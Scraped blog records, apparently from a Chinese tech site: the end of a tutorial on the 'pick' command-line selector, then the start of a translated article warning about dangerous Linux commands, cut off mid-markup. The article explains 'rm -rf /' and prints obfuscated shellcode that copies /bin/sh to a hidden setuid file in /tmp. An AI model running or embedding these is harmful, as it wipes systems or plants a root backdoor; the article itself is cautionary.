class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd abcd/efgh/ijkl/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9f9274126013-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9f9274126013-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abeba9f9274126013-1\"><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">abcd</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">efgh</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ijkl</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9f9274126013-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者，创建一个<a href=\"https://www.ostechnix.com/create-shortcuts-frequently-used-directories-shell/\">快捷方式</a> 或者说别名指向这个目录，这样你可以迅速进入该目录。</p>\n<p>但，使用 <code>pick</code> 命令则问题变得简单的多。看下面这个例子。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abeba9fc127133187\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd $(find . -type d | pick)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abeba9fc127133187-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abeba9fc127133187-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abeba9fc127133187-1\"><span class=\"crayon-i\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pick</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abeba9fc127133187-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这个命令会列出当前工作目录下的所有目录及其子目录，你可以用上下箭头选择你想进入的目录，然后按下回车就行了。</p>\n<p>像这样：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/7d112f146569e6ad0cf3eb62defddc10.png\" alt=\"\"></p>\n<p>而且，它还会根据你输入的内容过滤目录和文件。比如，当我输入 “or” 时会显示如下结果。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/1db4853003ed6321a72b1ac1ff473d3d.png\" alt=\"\"></p>\n<p>这只是一个例子。你也可以将 <code>pick</code> 命令跟其他命令一起混用。</p>\n<p>这是另一个例子。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abebaa00705920947\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfind -type f | pick | xargs less\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abebaa00705920947-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abebaa00705920947-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abebaa00705920947-1\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pick</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">xargs </span><span class=\"crayon-i\">less</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abebaa00705920947-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>该命令让你选择当前目录中的某个文件并用 <code>less</code> 来查看它。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/cbfa180365bc1990e9121309b81fb5ee.png\" alt=\"\"></p>\n<p>还想看其他例子？还有呢。下面命令让你选择当前目录下的文件或目录，并将之迁移到其他地方去，比如这里我们迁移到 <code>/home/sk/ostechnix</code>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abebaa03535814371\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmv \"$(find . -maxdepth 1 |pick)\" /home/sk/ostechnix/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abebaa03535814371-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abebaa03535814371-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abebaa03535814371-1\"><span class=\"crayon-i\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$(find . -maxdepth 1 |pick)\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sk</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abebaa03535814371-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/6187091d46b0b73336ddb482c5ae6f40.png\" alt=\"\"></p>\n<p>通过上下按钮选择要迁移的文件，然后按下回车就会把它迁移到 <code>/home/sk/ostechnix/</code> 目录中的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/b7df7f0dcb71b09605e0bb76d84f68b7.png\" alt=\"\"></p>\n<p>从上面的结果中可以看到，我把一个名叫 <code>abcd</code> 的目录移动到 <code>ostechnix</code> 目录中了。</p>\n<p>使用方式是无限的。甚至 Vim 编辑器上还有一个叫做 <a href=\"https://github.com/calleerlandsson/pick.vim/\">pick.vim</a> 的插件让你在 Vim 中选择更加方便。</p>\n<p>要查看详细信息，请参阅它的 man 页。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abebaa07278242302\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nman pick\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abebaa07278242302-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abebaa07278242302-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abebaa07278242302-1\"><span class=\"crayon-e\">man </span><span class=\"crayon-i\">pick</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abebaa07278242302-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>我们的讲解至此就结束了。希望这款工具能给你们带来帮助。如果你觉得我们的指南有用的话，请将它分享到您的社交网络上，并向大家推荐我们。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113480\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113480votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113480\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/c45857466a0e2dd99c4e857f56ca13903c5eac72.jpg"}
{"url_object_id": "e3a2ad757e369fe8e6d1f11af56e0091", "title": "绝不要用的 Linux 命令 ！", "url": "http://blog.jobbole.com/113437/", "create_date": "2018/01/07", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/98f8ce146e703f781626982be880cdf5.jpeg"], "praise_nums": 1, "comment_nums": 4, "favor_nums": 5, "tags": "IT技术,命令", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.hpe.com/us/en/insights/articles/the-linux-commands-you-should-never-use-1712.html\">Steven Vaughan-nichols</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9206-1.html\"> ChenYi</a>   </div><p><strong>当然，除非你想干掉你的机器。</strong></p>\n<div id=\"article_content\">\n<p>蜘蛛侠有这样的一句信条，“权力越大，责任越大。” 对于 Linux 系统管理员们来说，这也是一种应当采用的明智态度。</p>\n<p>不，真的，真心感谢 DevOps 的沟通协作和云编排技术，让一个 Linux 管理员不仅能掌控一台服务器，甚者能控制成千上万台服务器实例。只需要一个愚蠢的举动，你甚至可以毁掉一个价值数十亿美元的企业，就像 <a href=\"http://www.zdnet.com/article/equifax-blames-open-source-software-for-its-record-breaking-security-breach/\">没有打补丁的 Apache Struts</a> 一样。</p>\n<p>如果不能跑在安全补丁之前，这将会带来一个远超过系统管理员工资水平的战略性业务问题。这里就有一些足以搞死 Linux 服务器的简单方式掌握在系统管理员手中。很容易想象到，只有新手才会犯这些错误，但是，我们需要了解的更多。</p>\n<p>下列是一些著名的命令，任何拥有 root 权限的用户都能借助它们对服务器造成严重破坏。</p>\n<p><strong>警告：千万不要在生产环境运行这些命令，它们会危害你的系统。不要在家里尝试，也不要在办公室里测试。</strong></p>\n<p>那么，继续！</p>\n<h1 id=\"toc_1\">rm -rf /</h1>\n<p>想要干脆利落的毁掉一个 Linux 系统吗？你无法超越这个被誉为“史上最糟糕”的经典，它能删除一切，我说的是，能删除所有存在你系统里的内容！</p>\n<p>和大多数 <a href=\"https://www.hpe.com/us/en/insights/articles/16-linux-server-monitoring-commands-you-really-need-to-know-1703.html\">Linux 命令</a>一样，<strong>rm</strong> 这个核心命令使用起来非常方便。即便是最顽固的文件它也能帮你删除。结合起后面两个参数理解 <strong>rm</strong> 指令时，你很容易陷入大麻烦：<strong>-r</strong>，强制递归删除所有子目录，<strong>-f</strong>，无需确认，强制删除所有只读文件。如果你在根目录运行这条指令，将清除整个驱动器上的所有数据。</p>\n<p>如果你真这么干了，想想该怎么和老板解释吧！</p>\n<p>现在，也许你会想，“我永远不会犯这么愚蠢的错误。”朋友，骄兵必败。吸取一下经验教训吧， <a href=\"https://www.reddit.com/r/sysadmin/comments/732skq/after_21_years_i_finally_made_the_rm_boo_boo/\">这个警示故事来自于一个系统管理员在 Reddit 上的帖子</a>：</p>\n<blockquote><p>我在 IT 界工作了很多年，但是今天，作为 Linux 系统 root 用户，我在错误的系统路径运行了 <strong>rm- f</strong></p>\n<p>长话短说，那天，我需要复制一大堆目录从一个目录到另一个目录，和你一样，我敲了几个 <strong>cp -R</strong> 去复制我需要的内容。</p>\n<p>以我的聪明劲，我持续敲着上箭头，在命令记录中寻找可以复制使用的类似命令名，但是它们混杂在一大堆其他命令当中。</p>\n<p>不管怎么说，我一边在 Skype、Slack 和 WhatsApp 的网页上打字，一边又和 Sage 通电话，注意力严重分散，我在敲入 <strong>rm -R ./videodir/* ../companyvideodirwith651vidsin/</strong> 这样一条命令时神游物外。</p></blockquote>\n<p>然后，当文件化为乌有时其中也包括了公司的视频。幸运的是，在疯狂敲击 <strong>control -C</strong> 后，在删除太多文件之前，系统管理员中止了这条命令。但这是对你的警告：任何人都可能犯这样的错误。</p>\n<p>事实上，绝大部分现代操作系统都会在你犯这些错误之前，用一段醒目的文字警告你。然而，如果你在连续敲击键盘时忙碌或是分心，你将会把你的系统键入一个黑洞。（LCTT 译注：幸运的是，可能在根目录下删除整个文件系统的人太多了额，后来 <strong>rm</strong> 默认禁止删除根目录，除非——你手动加上 <strong>–no-preserve-root</strong> 参数！）</p>\n<p>这里有一些更为隐蔽的方式调用 <strong>rm -rf</strong>。思考一下下面的代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca54c0f126051257\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchar esp[] __attribute__ ((section(“.text”))) = “\\xeb\\x3e\\x5b\\x31\\xc0\\x50\\x54\\x5a\\x83\\xec\\x64\\x68”\r\n“\\xff\\xff\\xff\\xff\\x68\\xdf\\xd0\\xdf\\xd9\\x68\\x8d\\x99”\r\n“\\xdf\\x81\\x68\\x8d\\x92\\xdf\\xd2\\x54\\x5e\\xf7\\x16\\xf7”\r\n“\\x56\\x04\\xf7\\x56\\x08\\xf7\\x56\\x0c\\x83\\xc4\\x74\\x56”\r\n“\\x8d\\x73\\x08\\x56\\x53\\x54\\x59\\xb0\\x0b\\xcd\\x80\\x31”\r\n“\\xc0\\x40\\xeb\\xf9\\xe8\\xbd\\xff\\xff\\xff\\x2f\\x62\\x69”\r\n“\\x6e\\x2f\\x73\\x68\\x00\\x2d\\x63\\x00”\r\n“cp -p /bin/sh /tmp/.beyond; chmod 4755\r\n/tmp/.beyond;”;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c0f126051257-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca54c0f126051257-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c0f126051257-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca54c0f126051257-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c0f126051257-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca54c0f126051257-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c0f126051257-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca54c0f126051257-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca54c0f126051257-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca54c0f126051257-1\"><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">esp</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__attribute__</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">section</span><span class=\"crayon-sy\">(</span>“<span class=\"crayon-sy\">.</span><span class=\"crayon-i\">text</span>”<span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span>“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xeb</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x3e</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x5b</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x31</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xc0</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x50</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x54</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x5a</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x83</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xec</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x64</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x68</span>”</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca54c0f126051257-2\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xff</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x68</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xdf</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xd0</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xdf</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xd9</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x68</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x8d</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-i\">x99</span>”</div><div class=\"crayon-line\" id=\"crayon-5a6359ca54c0f126051257-3\">“<span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">xdf</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x81</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">x68</span><span class=\"crayon-sy\">\\</span><span 